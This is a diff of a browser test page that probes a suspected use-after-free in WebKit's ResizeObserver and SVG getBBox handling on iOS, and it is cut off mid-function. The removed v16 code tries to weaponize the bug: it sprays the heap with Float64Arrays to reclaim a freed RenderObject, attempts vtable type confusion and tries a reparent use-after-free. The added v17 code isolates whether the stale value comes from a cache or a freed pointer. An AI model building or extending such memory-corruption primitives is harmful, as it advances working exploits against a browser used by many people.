@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG RO-window UAF v16 · ResizeObserver async window · iOS 26.5.2</title>
+<title>SVG RO primitive isolation v17 · getBBox stale cache vs UAF · iOS 26.5.2</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -18,19 +18,20 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG RO-window UAF v16 · ResizeObserver async window · iOS 26.5.2 A16 arm64e</h2>
+<h2>SVG RO primitive isolation v17 · cache vs UAF vs deferred-destroy · iOS 26.5.2</h2>
 <div class="sub">
-  v15 FINDING: ResizeObserver callback — entry.target.getBBox()=80 AFTER sym1.remove() inside callback
-  v16: weaponize the RO window — remove sym1 BEFORE callback fires, then spray freed slot
-  Goal: entry.target.getBBox() returns sprayed float value = memory read / type confusion primitive
+  v15: entry.target.getBBox()=80 inside RO callback AFTER remove() — 20/20
+  v16: crW=80 stale in DBL; loop guard killed 2nd callback in WIN/SPR/TYP/MOV
+  v17: isolate whether 80 = JS-cache, stale RenderObj ptr, or deferred destroy
+  key test: resize to W=123 before callback — does getBBox return 80 or 123 after remove?
 </div>
 <div id="stage"><svg id="livesvg" width="200" height="200" viewBox="0 0 100 100"></svg></div>
 <div id="controls">
-  <button onclick="runWIN()">WIN pre-remove window</button>
-  <button onclick="runSPR()">SPR spray freed slot</button>
-  <button onclick="runTYP()">TYP type confusion</button>
-  <button onclick="runMOV()">MOV reparent UAF</button>
-  <button onclick="runDBL()">DBL double-observe</button>
+  <button onclick="runCAC()">CAC baseline cache</button>
+  <button onclick="runDEL()">DEL delta resize</button>
+  <button onclick="runDEF()">DEF deferred read</button>
+  <button onclick="runROI()">ROI ro-isolated repro</button>
+  <button onclick="runSEQ()">SEQ sequential read</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -38,63 +39,85 @@ button:disabled{opacity:.3}
 <div id="log"></div>
 <script>
 /*
- * v15 CONFIRMED: ResizeObserver callback keeps RenderObject ALIVE past remove()
- *   entry.target.getBBox() = 80 AFTER sym1.remove() called inside RO callback
- *   tgtBBW = 80 on 20/20 trials — 100% repro
+ * QUESTION: what is the v15 getBBox()=80 after remove() actually reading?
  *
- * KEY QUESTION for v16:
- *   v15 removed sym1 INSIDE the RO callback (same microtask)
- *   What if we remove sym1 BEFORE the callback fires?
- *   → remove from setTimeout/another event while RO delivery is queued
- *   → does RO callback still hold a live RenderObject ptr?
+ * THREE HYPOTHESES:
  *
- * IF YES → true async UAF window:
- *   The RenderObject was freed by remove() but RO delivery kept a stale ptr
- *   Reading getBBox() through that ptr = reading freed C++ memory
- *   Spray JS ArrayBuffers at the freed size class between remove() and callback
- *   → getBBox() returns contents of our sprayed object = memory read primitive
+ * H1: JS-SIDE CACHE
+ *   WebKit caches the last computed bbox on the JS SVGElement wrapper object
+ *   After remove(), getBBox() returns the cached value from last layout
+ *   This is NOT a UAF — it's a benign JS object property
+ *   FALSIFY: resize element to W=123 before remove → if getBBox returns 80, it's stale ptr
+ *            if getBBox returns 123, it's a JS cache (returns latest known value)
+ *   ALSO: test getBBox() on removed element OUTSIDE any RO → should return same value if H1
+ *
+ * H2: STALE RENDEROBJECT POINTER (UAF)
+ *   WebKit's RO delivery holds a reference to the element's RenderObject
+ *   remove() is called but RenderObject not freed until RO delivery completes
+ *   getBBox() dereferences the live (but freed-in-concept) RenderObject
+ *   This is a true UAF window — the RO delivery phase protects the RenderObject
+ *   FALSIFY: if we can READ through the ptr AND the value matches layout state
+ *            (not a JS cache), it's H2
+ *   CONFIRM: resize to 123 → remove → getBBox inside RO callback → returns 123?
+ *            (ptr is live, returns current render state = true stale ptr read)
+ *
+ * H3: DEFERRED DESTROY (WebKit intentionally defers during RO delivery)
+ *   WebKit explicitly defers RenderObject destruction during RO callback
+ *   This is BY DESIGN — a feature, not a bug
+ *   The RenderObject IS still alive (ref-counted, not freed)
+ *   getBBox() returns valid data because the object is genuinely alive
+ *   NOT a UAF — just an intentional deferral
+ *   FALSIFY: if we can force the RenderObject to be freed BEFORE the callback
+ *            and the read still returns 80 → H2 (not H3, H3 would return 0)
  *
  * TESTS:
  *
- * WIN (pre-remove window):
- *   Classic timing split:
- *   Phase 1: RO.observe(observed) → layout → RO queued (not yet fired)
- *   Phase 2: setTimeout(0) → REMOVE sym1 before RO fires
- *   Phase 3: RO callback fires → read entry.target.getBBox()
- *   Expected: if 80 → RO holds stale ptr to freed RenderObject
- *   Expected: if 0  → WebKit invalidated ptr on remove() (safe)
- *   Key metric: tgtBBW after external remove
+ * CAC (cache baseline):
+ *   getBBox() on removed rect OUTSIDE any RO context
+ *   Immediately after remove(), in same sync block
+ *   Also: after raf(), after tick() — does value decay?
+ *   Also: after modifying attribute while removed — does value update?
+ *   If getBBox returns 80 outside RO = JS cache exists regardless of RO
  *
- * SPR (spray freed slot):
- *   Same as WIN but between remove() and callback:
- *   → allocate 1000x Float64Array(N) to fill freed RenderObject slot
- *   → fill with known float pattern (e.g. 1337.0, 0xdeadbeef as float)
- *   → RO callback getBBox() → if returns our pattern = heap spray landed
- *   Size class matters: need to match RenderSVGRect/RenderSVGSymbol size
- *   Try multiple Float64Array sizes to hit the right size class
+ * DEL (delta resize — key test):
+ *   1. Create rect W=80 → lay out → RO.observe
+ *   2. Inside RO callback phase 1: resize rect to W=123 (triggers re-layout)
+ *   3. Inside same callback: remove rect immediately after resize
+ *   4. Read getBBox() inside same RO callback
+ *   Result A: returns 80 → stale ptr to PRE-resize RenderObject (H2, old ptr)
+ *   Result B: returns 123 → live ptr or JS cache (current value, H2 or H3)
+ *   Result C: returns 0 → cleaned up before read (no UAF)
+ *   This is the KEY test. 80 vs 123 tells us if the ptr is stale to OLD layout.
  *
- * TYP (type confusion):
- *   After remove(), before RO callback:
- *   → insert a DIFFERENT element type at the same DOM position
- *   → RO callback entry.target should still be sym1 (JS strong ref)
- *   → but RenderObject at that address is now a DIFFERENT type
- *   → getBBox() dispatches through wrong vtable = type confusion
- *   Try: replace sym1 with SVGCircleElement, SVGImageElement, SVGTextElement
+ * DEF (deferred read timing):
+ *   Inside RO callback: remove rect → then read getBBox at multiple timing points:
+ *     - sync (same callback tick)
+ *     - queueMicrotask
+ *     - setTimeout(0)
+ *     - requestAnimationFrame
+ *   If sync=80, microtask=80, setTimeout=0 → RO delivery phase protects RenderObject
+ *   If sync=80, microtask=0 → protection ends at microtask boundary
+ *   Tells us exactly HOW LONG the window is open
  *
- * MOV (reparent UAF):
- *   Move sym1 to a different SVG context AFTER RO observes it:
- *   → RO observes sym1 in livesvg → layout → RO queued
- *   → Move sym1 to a different SVG (different RenderLayer)
- *   → Old RenderObject freed (detached from old tree)
- *   → RO callback fires → entry.target still sym1 → getBBox() reads old RO
- *   This is a classic reparent UAF pattern
+ * ROI (RO isolated repro):
+ *   Exact reproduction of v15 tgtBBW=80 scenario
+ *   Single callback, remove inside, read immediately
+ *   Confirm the primitive is stable, measure exact conditions
+ *   Also: try with different element sizes (20, 40, 60, 80, 100, 120)
+ *   If all return their W → RO callback preserves layout state regardless of size
  *
- * DBL (double-observe):
- *   Observe sym1 twice with two different ROs
- *   Remove sym1 after first RO fires (inside first callback)
- *   Second RO callback fires with sym1 already removed
- *   Does second callback see stale geometry?
- *   Also: disconnect first RO inside its callback → does that affect second?
+ * SEQ (sequential mutations inside callback):
+ *   Inside RO callback:
+ *   a. getBBox() → should be 80 (element alive)
+ *   b. remove()
+ *   c. getBBox() → 80? (H2/H3) or 0? (H1 wouldn't know to return 0)
+ *   d. setAttribute width=999 (mutate while removed)
+ *   e. getBBox() → 80? 999? 0?
+ *   f. re-insert into DOM
+ *   g. getBBox() → new layout value?
+ *   h. remove() again
+ *   i. getBBox() → stale from (f)?
+ *   Full lifecycle trace to understand exact behavior at each step
  */
 
 const SVG_NS='http://www.w3.org/2000/svg';
@@ -104,514 +127,394 @@ function log(m,c){const s=document.createElement('span');if(c)s.className=c;s.te
 const sep=()=>log('─'.repeat(52),'sep');
 const raf=()=>new Promise(r=>requestAnimationFrame(r));
 const tick=()=>new Promise(r=>setTimeout(r,0));
-const micro=()=>new Promise(r=>queueMicrotask(r));
-function f2h(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return'0x'+new Uint32Array(b)[0].toString(16).padStart(8,'0');}
-function f2h64(f){const b=new ArrayBuffer(8);new Float64Array(b)[0]=f;const v=new DataView(b);return'0x'+v.getUint32(4,true).toString(16).padStart(8,'0')+'_'+v.getUint32(0,true).toString(16).padStart(8,'0');}
 function copyLog(){try{navigator.clipboard.writeText(Lel.innerText);}catch(e){const a=document.createElement('textarea');a.value=Lel.innerText;document.body.appendChild(a);a.select();document.execCommand('copy');a.remove();}}
 function clearLog(){Lel.innerHTML='';}
 function dis(d){document.querySelectorAll('button').forEach(b=>{if(!b.onclick?.toString().match(/copy|clear/i))b.disabled=d;});}
-window.onerror=(m,_,l,c,err)=>{log(`[CRASH] ${m} L${l}:${c} stack=${err?.stack?.slice(0,80)}`,'bad');return false;};
-window.onunhandledrejection=e=>{log(`[UNHANDLED] ${e.reason}`,'bad');};
+window.onerror=(m,_,l,c)=>{log(`[ERR] ${m} L${l}:${c}`,'bad');return false;};
+window.onunhandledrejection=e=>{log(`[REJ] ${e.reason}`,'bad');};
 
 function mkRect(id,w,h){
     const r=document.createElementNS(SVG_NS,'rect');
-    r.setAttribute('id',id);r.setAttribute('x','5');r.setAttribute('y','5');
+    r.setAttribute('id',id||'r');
+    r.setAttribute('x','5');r.setAttribute('y','5');
     r.setAttribute('width',String(w||80));r.setAttribute('height',String(h||80));
     r.setAttribute('fill','blue');
     return r;
 }
-function mkSym(id,w,h){
-    const sym=document.createElementNS(SVG_NS,'symbol');
-    sym.setAttribute('id',id);sym.setAttribute('viewBox','0 0 100 100');
-    const r=mkRect(`${id}_r`,w,h);sym.appendChild(r);return sym;
+
+// ── CAC: baseline cache — getBBox on removed element outside RO ──────────
+async function runCAC(q=false){
+    if(!q){dis(true);sep();log('▶ CAC: getBBox on removed element — outside RO context','inf');sep();}
+    log('[*] does WebKit cache last bbox on SVGElement JS wrapper?','inf');
+    log('[*] tests: immediate, after raf, after tick, after attribute mutate','ok');
+    log('[*] if 80 outside RO context → JS cache (not RO-specific behavior)','ok');log('');
+
+    const results=[];
+    for(let t=0;t<12;t++){
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();await raf();
+
+        const r=mkRect(`cac_${t}`,80,80);
+        livesvg.appendChild(r);
+        await raf();await raf();
+
+        // Baseline before remove
+        let base=null;try{base=r.getBBox().width;}catch(e){}
+
+        // SYNC remove + immediate getBBox
+        r.remove();
+        let syncW=null;try{syncW=r.getBBox().width;}catch(e){}
+
+        // Mutate while removed — does cached value update?
+        r.setAttribute('width','123');
+        let mutW=null;try{mutW=r.getBBox().width;}catch(e){}
+
+        // Re-insert, force layout, then remove again
+        livesvg.appendChild(r);
+        await raf();
+        let relayoutW=null;try{relayoutW=r.getBBox().width;}catch(e){}
+        r.remove();
+        let postRelayoutW=null;try{postRelayoutW=r.getBBox().width;}catch(e){}
+
+        // After raf — does value change?
+        await raf();
+        let rafW=null;try{rafW=r.getBBox().width;}catch(e){}
+
+        // After tick
+        await tick();
+        let tickW=null;try{tickW=r.getBBox().width;}catch(e){}
+
+        const res={base,syncW,mutW,relayoutW,postRelayoutW,rafW,tickW};
+        results.push(res);
+
+        // KEY: is syncW=80 (old layout) or 0 (no cache) or something else?
+        const interesting=syncW!==0||mutW!==0||postRelayoutW!==0;
+        log(`  t${t}: base=${base} sync=${syncW} mut(123)=${mutW} relayout=${relayoutW} postRelay=${postRelayoutW} raf=${rafW} tick=${tickW}`,(interesting?'bad':'dim'));
+
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();
+    }
+
+    // Summarize
+    const syncNon0=results.filter(r=>r.syncW!==0).length;
+    const mutNon0=results.filter(r=>r.mutW!==0).length;
+    log(`\n[*] CAC: syncW≠0: ${syncNon0}/12, mutW≠0: ${mutNon0}/12`,(syncNon0>0?'bad':'inf'));
+    if(syncNon0>0)log(`[!] getBBox OUTSIDE RO returns stale value — JS cache confirmed`,'inf');
+    else log(`[+] getBBox returns 0 outside RO — v15 value of 80 is RO-SPECIFIC`,'bad');
+
+    if(!q)dis(false);
+    return{syncNon0,mutNon0,results};
 }
 
-// ── WIN: pre-remove window test ───────────────────────────────────────────
-// Remove sym1 from outside the RO callback, then let callback fire
-// Key: does tgtBBW remain 80 even though remove() happened before callback?
-async function runWIN(q=false){
-    if(!q){dis(true);sep();log('▶ WIN: remove sym1 BEFORE RO callback fires — does callback see stale ptr?','inf');sep();}
-    log('[*] phase1: RO.observe → layout → RO queued','inf');
-    log('[*] phase2: setTimeout remove sym1 (before callback)','ok');
-    log('[*] phase3: RO fires → read entry.target.getBBox() → stale or 0?','ok');
-    log('[*] STALE(80) = RO holds freed RenderObject ptr → UAF window confirmed','bad');log('');
+// ── DEL: delta resize — key test to distinguish H1/H2/H3 ─────────────────
+async function runDEL(q=false){
+    if(!q){dis(true);sep();log('▶ DEL: resize to W=123 inside RO callback THEN remove → getBBox=80 or 123?','inf');sep();}
+    log('[*] H2(stale old ptr): returns 80 (ptr to pre-resize RenderObject)','ok');
+    log('[*] H3(deferred, live): returns 123 (live RO reflects new size)','ok');
+    log('[*] H1(JS cache): returns 123 (cache updated on setAttribute)','ok');
+    log('[*] 0 = no UAF, RO not protecting anything','ok');log('');
 
-    let hit=0,miss=0,cbFired=0;
+    let got80=0,got123=0,got0=0,gotOther=0;
     const vals=[];
 
-    for(let t=0;t<24;t++){
+    for(let t=0;t<20;t++){
         while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
         await raf();await raf();
 
-        // Observed element: plain rect (RO works on anything with a box)
-        const observed=mkRect(`win_r_${t}`,80,80);
-        livesvg.appendChild(observed);
-        await raf();await raf(); // layout so RO has geometry
+        const r=mkRect(`del_${t}`,80,80);
+        livesvg.appendChild(r);
+        await raf();await raf();
 
         await new Promise(resolve=>{
-            let resolved=false,removePhase=false;
+            let resolved=false,phase=0;
+            const safeResolve=()=>{if(!resolved){resolved=true;resolve();}};
+            setTimeout(safeResolve,400);
+
+            const ro=new ResizeObserver(()=>{
+                phase++;
+                if(phase>1){ro.disconnect();safeResolve();return;}
+
+                // Phase 1: resize first (forces re-layout queued inside RO)
+                r.setAttribute('width','123');
+                // Flush layout synchronously (getBBox forces layout)
+                let afterResize=null;
+                try{afterResize=r.getBBox().width;}catch(e){}
+
+                // NOW remove
+                try{r.remove();}catch(e){}
+
+                // Read immediately after remove, still inside RO callback
+                let postRemoveW=null;
+                try{postRemoveW=r.getBBox().width;}catch(e){}
+
+                // Read bounding client rect — different code path
+                let bcW=null;
+                try{bcW=r.getBoundingClientRect().width;}catch(e){}
+
+                // Read contentRect from entry (if available via closure)
+                vals.push({t,afterResize,postRemoveW,bcW});
+
+                if(postRemoveW===80){got80++;log(`  t${t}: afterResize=${afterResize} postRemove=${postRemoveW} bc=${bcW} → [80=STALE OLD PTR]`,'bad');}
+                else if(postRemoveW===123){got123++;log(`  t${t}: afterResize=${afterResize} postRemove=${postRemoveW} bc=${bcW} → [123=LIVE/CACHE]`,'inf');}
+                else if(postRemoveW===0){got0++;if(t<4)log(`  t${t}: afterResize=${afterResize} postRemove=${postRemoveW} bc=${bcW}`,'dim');}
+                else{gotOther++;log(`  t${t}: afterResize=${afterResize} postRemove=${postRemoveW} bc=${bcW} → [OTHER=${postRemoveW}]`,'bad');}
+
+                ro.disconnect();safeResolve();
+            });
+            try{ro.observe(r);}catch(ex){safeResolve();}
+        });
+
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();
+    }
+
+    log(`\n[*] DEL: got80=${got80} got123=${got123} got0=${got0} other=${gotOther}`);
+    if(got80>0)log(`[!!] 80 RETURNED = STALE RENDEROBJECT PTR — pre-resize geometry = true UAF read`,'bad');
+    if(got123>0)log(`[*] 123 returned = live RO or JS cache (deferred destroy or benign)`,'inf');
+    if(got0===20)log(`[*] all 0 = no data survives remove inside RO callback`,'dim');
+
+    if(!q)dis(false);
+    return{got80,got123,got0,gotOther};
+}
+
+// ── DEF: how long is the window — sync vs micro vs tick vs raf ───────────
+async function runDEF(q=false){
+    if(!q){dis(true);sep();log('▶ DEF: timing of getBBox after remove inside RO — how long is window?','inf');sep();}
+    log('[*] inside RO callback: remove then read at: sync / microtask / tick / raf','inf');
+    log('[*] where does the value go from 80 to 0? = window boundary','ok');log('');
+
+    const timings={sync:[],micro:[],tick:[],raf:[]};
+
+    for(let t=0;t<12;t++){
+        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
+        await raf();await raf();
+
+        const r=mkRect(`def_${t}`,80,80);
+        livesvg.appendChild(r);
+        await raf();await raf();
+
+        const reads={sync:null,micro:null,tick:null,raf:null};
+
+        await new Promise(resolve=>{
+            let resolved=false,phase=0;
             const safeResolve=()=>{if(!resolved){resolved=true;resolve();}};
             setTimeout(safeResolve,600);
 
-            const ro=new ResizeObserver((entries)=>{
-                cbFired++;
-                if(!removePhase){
-                    // First callback: element still alive
-                    // Queue the remove for NEXT microtask, then let RO fire again
-                    removePhase=true;
-                    // Schedule remove slightly after — but BEFORE next RO
-                    queueMicrotask(()=>{
-                        try{observed.remove();}catch(ex){}
-                        // Force another layout observation by mutating size
-                        // This may re-queue RO callback with stale ptr
-                    });
-                    // Keep observing — RO should fire again after layout
-                    return;
-                }
+            const ro=new ResizeObserver(()=>{
+                phase++;
+                if(phase>1){ro.disconnect();safeResolve();return;}
 
-                // Second (or later) callback — observed was removed before this
-                const entry=entries[0];
-                if(!entry){ro.disconnect();safeResolve();return;}
+                r.remove();
 
-                let tgtBBW=null,tgtBBCrash=null;
-                try{
-                    // entry.target is the observed rect — removed before this callback
-                    const bb=entry.target.getBBox();
-                    tgtBBW=bb.width;
-                }catch(ex){tgtBBCrash=ex.message.slice(0,40);}
+                // SYNC — same callback tick
+                try{reads.sync=r.getBBox().width;}catch(e){reads.sync='ERR';}
 
-                let crW=null;
-                try{crW=entry.contentRect?.width;}catch(ex){}
+                // MICROTASK — next microtask
+                queueMicrotask(()=>{
+                    try{reads.micro=r.getBBox().width;}catch(e){reads.micro='ERR';}
+                });
 
-                // Also getBoundingClientRect — different code path
-                let bcW=null;
-                try{bcW=entry.target.getBoundingClientRect().width;}catch(ex){}
-
-                const isStale=(tgtBBW!==null&&tgtBBW!==0)||(tgtBBCrash);
-                if(isStale){hit++;vals.push(tgtBBW);}else{miss++;}
-
-                log(`  t${t}: crW=${crW} tgtBBW=${tgtBBW??tgtBBCrash} bcW=${bcW} phase=${removePhase}`,(isStale?'bad':'dim'));
-                ro.disconnect();safeResolve();
-            });
-
-            try{ro.observe(observed);}
-            catch(ex){log(`  t${t}: observe fail: ${ex.message}`,'dim');safeResolve();}
-        });
-
-        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        await raf();
-    }
-
-    log(`\n[*] WIN: cbFired=${cbFired} hit=${hit} miss=${miss}`,(hit>0?'bad':'inf'));
-    if(vals.length)log(`[*] stale vals: ${[...new Set(vals)].join(' ')}`,'bad');
-    if(hit>0)log(`[+] PRE-REMOVE WINDOW CONFIRMED — RO holds stale RenderObject ptr!`,'bad');
-
-    if(!q)dis(false);
-    return{cbFired,hit,miss};
-}
-
-// ── SPR: spray freed slot between remove() and RO callback ───────────────
-// After remove(), before callback fires: spray ArrayBuffers to fill freed slot
-// If getBBox() returns our sprayed float → heap spray + stale ptr read confirmed
-async function runSPR(q=false){
-    if(!q){dis(true);sep();log('▶ SPR: spray freed RenderObject slot → read spray via getBBox()','inf');sep();}
-    log('[*] remove observed → spray ArrayBuffers → RO fires → getBBox() = spray?','inf');
-    log('[*] target: RenderSVGRect size class (likely 128-512 bytes on arm64)','ok');
-    log('[*] spray float: 1337.1337 = 0x4494e44e (32-bit) or pattern64','ok');
-    log('[*] hit = float returned by getBBox().width matches spray value','bad');log('');
-
-    const SPRAY_FLOAT=1337.1337;
-    const SPRAY_FLOAT64=1337.1337;
-    // RenderSVGRect is roughly 200-400 bytes — try multiple size classes
-    // Float64Array(N): N*8 bytes + JS object overhead ~48 bytes
-    // Size classes to hit: 128, 192, 256, 320, 384, 512 bytes
-    const SPRAY_SIZES=[8,16,24,32,40,48,56,64]; // elements (×8 = bytes of float data)
-    const SPRAY_COUNT=2000;
-
-    let hit=0,miss=0,cbFired=0;
-    const hitVals=[];
-
-    for(let t=0;t<20;t++){
-        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        await raf();await raf();
-
-        const sz=SPRAY_SIZES[t%SPRAY_SIZES.length];
-        const observed=mkRect(`spr_r_${t}`,80,80);
-        livesvg.appendChild(observed);
-        await raf();await raf();
-
-        await new Promise(resolve=>{
-            let resolved=false,phase=0;
-            const safeResolve=()=>{if(!resolved){resolved=true;resolve();}};
-            setTimeout(safeResolve,500);
-
-            const ro=new ResizeObserver((entries)=>{
-                cbFired++;phase++;
-                const entry=entries[0];
-                if(!entry){ro.disconnect();safeResolve();return;}
-
-                if(phase===1){
-                    // First: remove observed THEN spray
-                    try{observed.remove();}catch(ex){}
-                    // Spray heap with known float pattern
-                    const spray=[];
-                    for(let i=0;i<SPRAY_COUNT;i++){
-                        const a=new Float64Array(sz);
-                        a.fill(SPRAY_FLOAT64);
-                        spray.push(a);
-                    }
-                    // Keep spray alive, let GC run
-                    queueMicrotask(()=>{
-                        // Free some to create holes — UAF reads holes
-                        for(let i=0;i<SPRAY_COUNT;i+=2)spray[i]=null;
-                        // Force GC pressure
-                        for(let i=0;i<50000;i++)({});
-                    });
-                    // Don't disconnect — let second RO fire if possible
-                    return;
-                }
-
-                // phase 2+: read through stale ptr
-                let tgtW=null,tgtH=null,tgtX=null,tgtY=null,crash=null;
-                try{
-                    const bb=entry.target.getBBox();
-                    tgtW=bb.width;tgtH=bb.height;tgtX=bb.x;tgtY=bb.y;
-                }catch(ex){crash=ex.message.slice(0,40);}
-
-                let bcW=null;
-                try{bcW=entry.target.getBoundingClientRect().width;}catch(ex){}
-
-                const isHit=(tgtW!==null&&tgtW!==0&&tgtW!==80)||(crash);
-                const isSprayHit=Math.abs((tgtW||0)-SPRAY_FLOAT)<1;
-
-                if(isHit){
-                    hit++;hitVals.push({t,sz,tgtW,tgtH,tgtX,tgtY,bcW,crash});
-                    log(`  t${t} sz=${sz}: [HIT] w=${tgtW} h=${tgtH} x=${tgtX} y=${tgtY} bc=${bcW} crash=${crash}`,'bad');
-                    if(isSprayHit)log(`    ↑ SPRAY LANDED! w≈${SPRAY_FLOAT} → memory read confirmed`,'bad');
-                }else{
-                    miss++;
-                    if(t<4)log(`  t${t} sz=${sz}: w=${tgtW} h=${tgtH} crash=${crash}`,'dim');
-                }
-
-                ro.disconnect();safeResolve();
-            });
-
-            try{ro.observe(observed);}
-            catch(ex){log(`  t${t}: observe fail: ${ex.message}`,'dim');safeResolve();}
-        });
-
-        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        await raf();
-    }
-
-    log(`\n[*] SPR: cbFired=${cbFired} hit=${hit} miss=${miss}`,(hit>0?'bad':'inf'));
-    if(hitVals.length){
-        log(`[*] hit details:`,'bad');
-        hitVals.slice(0,5).forEach(v=>log(`  sz=${v.sz} w=${v.tgtW} h=${v.tgtH} x=${v.tgtX} y=${v.tgtY}`,'bad'));
-    }
-    if(hit>0)log(`[+] SPRAY HIT — reading freed RenderObject memory!`,'bad');
-
-    if(!q)dis(false);
-    return{cbFired,hit,miss,hitVals};
-}
-
-// ── TYP: type confusion via element replacement ───────────────────────────
-// RO observes elem A → remove A → insert elem B at same position
-// RO callback fires → entry.target = A (JS ref) BUT RenderObject at that addr = B's type
-// getBBox() dispatches through B's vtable with A's layout state = type confusion
-async function runTYP(q=false){
-    if(!q){dis(true);sep();log('▶ TYP: replace element type before RO callback — vtable type confusion','inf');sep();}
-    log('[*] RO observes rect → remove → insert circle/image/text at same slot','inf');
-    log('[*] RO callback: entry.target=rect BUT C++ ptr points to circle RenderObj','ok');
-    log('[*] getBBox() vtable dispatch on wrong type = type confusion crash/read','bad');log('');
-
-    const REPLACEMENTS=[
-        ()=>{const c=document.createElementNS(SVG_NS,'circle');c.setAttribute('cx','50');c.setAttribute('cy','50');c.setAttribute('r','40');c.setAttribute('fill','red');return c;},
-        ()=>{const t=document.createElementNS(SVG_NS,'text');t.setAttribute('x','10');t.setAttribute('y','50');t.textContent='EXPLOIT';return t;},
-        ()=>{const e=document.createElementNS(SVG_NS,'ellipse');e.setAttribute('cx','50');e.setAttribute('cy','50');e.setAttribute('rx','40');e.setAttribute('ry','20');return e;},
-        ()=>{const p=document.createElementNS(SVG_NS,'path');p.setAttribute('d','M10,10 L90,90 L10,90 Z');p.setAttribute('fill','green');return p;},
-        ()=>{const g=document.createElementNS(SVG_NS,'g');const r=document.createElementNS(SVG_NS,'rect');r.setAttribute('width','80');r.setAttribute('height','80');g.appendChild(r);return g;},
-    ];
-
-    let crash=0,confused=0,normal=0,cbFired=0;
-    const confusedVals=[];
-
-    for(let t=0;t<20;t++){
-        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        await raf();await raf();
-
-        const observed=mkRect(`typ_r_${t}`,80,80);
-        livesvg.appendChild(observed);
-        await raf();await raf();
-
-        const replFactory=REPLACEMENTS[t%REPLACEMENTS.length];
-        const replTag=replFactory().tagName;
-
-        await new Promise(resolve=>{
-            let resolved=false,phase=0;
-            const safeResolve=()=>{if(!resolved){resolved=true;resolve();}};
-            setTimeout(safeResolve,500);
-
-            const ro=new ResizeObserver((entries)=>{
-                cbFired++;phase++;
-                if(phase===1){
-                    // Remove observed AND insert replacement before next callback
-                    const repl=replFactory();
-                    try{observed.remove();}catch(ex){}
-                    queueMicrotask(()=>{
-                        try{livesvg.appendChild(repl);}catch(ex){}
-                        // Force layout so repl gets a RenderObject
-                        try{repl.getBBox();}catch(ex){}
-                    });
-                    return;
-                }
-
-                // Phase 2: read entry.target (should be observed/rect, not repl)
-                const entry=entries[0];
-                if(!entry){ro.disconnect();safeResolve();return;}
-
-                let tgtTag='?',tgtW=null,tgtCrash=null;
-                try{tgtTag=entry.target.tagName;}catch(ex){}
-                try{const bb=entry.target.getBBox();tgtW=bb.width;}catch(ex){tgtCrash=ex.message.slice(0,40);crash++;}
-
-                let tgtId='?';
-                try{tgtId=entry.target.id||'none';}catch(ex){}
-
-                // Is the returned geometry from the replacement type?
-                const isCrash=!!tgtCrash;
-                const isConfused=tgtTag!=='rect'||tgtId!==`typ_r_${t}`;
-
-                if(isCrash||isConfused){
-                    const v={t,tgtTag,tgtId,tgtW,tgtCrash,replTag};
-                    confusedVals.push(v);confused++;
-                    log(`  t${t}: [CONFUSED/CRASH] tgtTag=${tgtTag} id=${tgtId} w=${tgtW} crash=${tgtCrash} replType=${replTag}`,'bad');
-                }else{
-                    normal++;
-                    if(t<4)log(`  t${t}: normal tgtTag=${tgtTag} id=${tgtId} w=${tgtW} replType=${replTag}`,'dim');
-                }
-
-                ro.disconnect();safeResolve();
-            });
-
-            try{ro.observe(observed);}
-            catch(ex){log(`  t${t}: observe fail: ${ex.message}`,'dim');safeResolve();}
-        });
-
-        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        await raf();
-    }
-
-    log(`\n[*] TYP: cbFired=${cbFired} confused=${confused} normal=${normal} crash=${crash}`,(confused>0||crash>0?'bad':'inf'));
-    if(confusedVals.length)confusedVals.slice(0,4).forEach(v=>log(`  confused: tag=${v.tgtTag} id=${v.tgtId} w=${v.tgtW}`,'bad'));
-
-    if(!q)dis(false);
-    return{cbFired,confused,normal,crash};
-}
-
-// ── MOV: reparent UAF — move element to different SVG before callback ─────
-// RO observes elem in SVG-A → move elem to SVG-B (old RO freed)
-// RO callback fires → entry.target in SVG-B → getBBox() reads SVG-A render state?
-async function runMOV(q=false){
-    if(!q){dis(true);sep();log('▶ MOV: reparent observed element to different SVG before RO fires','inf');sep();}
-    log('[*] RO observes rect in SVG-A → move rect to SVG-B → RO fires','inf');
-    log('[*] entry.target is now in SVG-B — does getBBox() read SVG-A RenderObject?','ok');
-    log('[*] stale geometry = UAF across SVG render contexts','bad');log('');
-
-    // Create a second SVG context
-    const svg2=document.createElementNS(SVG_NS,'svg');
-    svg2.setAttribute('width','1');svg2.setAttribute('height','1');
-    svg2.setAttribute('style','position:fixed;bottom:0;right:240px');
-    document.body.appendChild(svg2);
-
-    let hit=0,miss=0,cbFired=0;
-    const hitVals=[];
-
-    for(let t=0;t<20;t++){
-        while(livesvg.firstChild)livesvg.removeChild(livesvg.firstChild);
-        while(svg2.firstChild)svg2.removeChild(svg2.firstChild);
-        await raf();await raf();
-
-        const observed=mkRect(`mov_r_${t}`,80,80);
-        livesvg.appendChild(observed);
-        await raf();await raf();
-
-        let baseBB=null;
-        try{baseBB=observed.getBBox();}catch(e){}
-
-        await new Promise(resolve=>{
-            let resolved=false,phase=0;
-            const safeResolve=()=>{if(!resolved){resolved=true;resolve();}};
-            setTimeout(safeResolve,500);
-
-            const ro=new ResizeObserver((entries)=>{
-                cbFired++;phase++;
-                if(phase===1){
-                    // Move observed to svg2 — this frees old RenderObject
-                    queueMicrotask(()=>{
-                        try{svg2.appendChild(observed);}catch(ex){}
-                        // Force layout in svg2 → new RenderObject created
-                        try{observed.getBBox();}catch(ex){}
-                    });
-                    return;
-                }
-
-                const entry=entries[0];
